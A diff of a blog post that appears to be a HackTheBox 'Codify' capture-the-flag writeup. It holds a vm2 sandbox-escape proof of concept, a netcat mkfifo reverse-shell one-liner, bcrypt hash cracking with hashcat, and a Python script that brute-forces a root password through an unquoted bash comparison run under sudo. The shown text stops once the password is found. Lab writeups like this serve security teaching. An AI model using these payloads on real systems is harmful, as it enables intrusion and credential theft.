@@ -1,10 +1,282 @@
 ---
-layout: encrypted
+layout: post
 title: Codify HackTheBox Machine - Writeup
 categories: [HackTheBox Machines]
-tags: [hackthebox,web,hackthebox easy,linux]
+tags: [hackthebox,web,hackthebox easy,linux,cve,rce,sql,hash cracking,scripting,bash,python]
 image:
   path: /images/htb/easy/codify/icon.png
-
-encrypted: 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
 ---
+
+An easy linux box to start off the year!
+
+**Machine created by:** [kavigihan](https://app.hackthebox.com/users/389926)
+
+## Recon
+I start off my recon by doing a portscan of the IP.
+
+```
+$ sudo nmap 10.10.11.239 --top-ports 1000
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 16:18 AEDT
+Nmap scan report for codify.htb (10.10.11.239)
+Host is up (0.016s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3000/tcp open  ppp
+
+Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
+```
+
+We can see 3 open ports, mainly of interest is HTTP.
+
+I edit my `/etc/hosts` to make a new entry:
+
+```
+10.10.11.239 codify.htb
+```
+
+After that I visit [codify.htb](http://codify.htb) and see this:
+
+![Front Page](/images/htb/easy/codify/frontpage.png)
+
+Seems to be a nodeJS code parser, looking at the `About Us` page (linked up the top) something catches my eye.
+
+![Uses vm2](/images/htb/easy/codify/codeeditor.png)
+
+They announce it running on `vm2`, and looking online there is a [very recent CVE for `vm2`](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244).
+
+They also mention on a limitation page about a ticketing system.
+
+![Limitation](/images/htb/easy/codify/limitations.png)
+
+## Exploitation
+
+Here is the PoC code that was linked in the CVE:
+
+```
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+}
+```
+
+We can change the command at the end from `touch pwned` to `whoami` to test it.
+
+![RCE](/images/htb/easy/codify/rce.png)
+
+Success, now lets setup a reverse shell.
+
+```
+$ pwncat-cs
+[16:41:49] Welcome to pwncat 🐈!
+(local) pwncat$ listen --host 10.10.***.*** 4444 -m linux
+[16:41:53] new listener created for 10.10.***.***:4444
+(local) pwncat$
+```
+
+I go to [revshells.com](https://revshells.com) to craft a payload to send to the server, using my HackTheBox private IP and port 4444.
+
+I use the following payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.***.*** 4444 >/tmp/f`
+
+and I get a shell!
+
+```
+[16:42:21] 10.10.11.239:51968: registered new host w/ db                               
+           listener: 10.10.***.***:4444: linux session from 10.10.11.239:51968            
+           established
+```
+
+## Initial Access & User Flag
+
+Inside the home directory there is another folder, `joshua`, which we cannot access.
+
+Looking at earlier, they also mention a ticketing system, and checking our `/var/www/contact`, we see a `tickets.db`.
+
+Running `file` shows it to be a SQLite3 database.
+
+I begin parsing it with `sqlite3`.
+
+```
+$ sqlite3
+sqlite> .open tickets.db
+sqlite> .tables
+tickets  users
+sqlite> .schema users
+CREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE,
+        password TEXT
+    );
+sqlite> SELECT * FROM users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+```
+
+We see joshua's password hash! Lets crack it with `hashcat` and use the [rockyou wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz).
+
+```
+$ hashcat -a 0 -m 3200 joshua.hash rockyou.txt
+
+...
+Session..........: hashcat
+Status...........: Cracked
+...
+
+$ hashcat -a 0 -m 3200 joshua.hash rockyou.txt --show
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+```
+
+His password is `spongebob1`! Lets SSH into his user account.
+```
+$ ssh josua@codify.htb
+
+...
+joshua@codify:~$ ls
+test  user.txt
+joshua@codify:~$ cat user.txt
+c815809e836105effb21a8b582939998
+```
+
+Our user flag <mark>c815809e836105effb21a8b582939998</mark>!
+
+## Root Flag
+
+Running `sudo -l` and inputting joshua's password immediately shows an entry
+
+```
+$ sudo -l
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+```
+
+An SQL backup script, lets see if we can exploit this.
+
+```bash
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+I poked around at the actual database it was using mySQL and could find some hashes but they weren't crackable.
+
+I then noticed an issue in the bash script.
+
+```bash
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+```
+
+The comparison of two variables without one being quoted is a [major error](https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29)!
+
+As a result the password input can just be `*` and we execute the script, pairing this with a little scripting we can bruteforce the root password, by sequenctially going `a*`, `b*`, `c*`...
+
+Here's a little script to do so:
+
+```python
+import subprocess
+from string import digits,ascii_letters
+characters = ascii_letters+digits
+password = ""
+found = False
+while not found:
+	for char in characters:
+		cmd=f"echo {password}{char}* | sudo /opt/scripts/mysql-backup.sh"
+		out=subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+		if "Password confirmed!" in out:
+			password+=char
+			print(f"Password: {password}")
+			break
+	else:
+		found = True
+		print(f"Password Found! {password}")
+```
+
+Running the script does the following:
+
+```
+Password: k
+Password: kl
+Password: klj
+Password: kljh
+Password: kljh1
+Password: kljh12
+Password: kljh12k
+Password: kljh12k3
+Password: kljh12k3j
+Password: kljh12k3jh
+Password: kljh12k3jha
+Password: kljh12k3jhas
+Password: kljh12k3jhask
+Password: kljh12k3jhaskj
+Password: kljh12k3jhaskjh
+Password: kljh12k3jhaskjh1
+Password: kljh12k3jhaskjh12
+Password: kljh12k3jhaskjh12k
+Password: kljh12k3jhaskjh12kj
+Password: kljh12k3jhaskjh12kjh
+Password: kljh12k3jhaskjh12kjh3
+Password Found! kljh12k3jhaskjh12kjh3
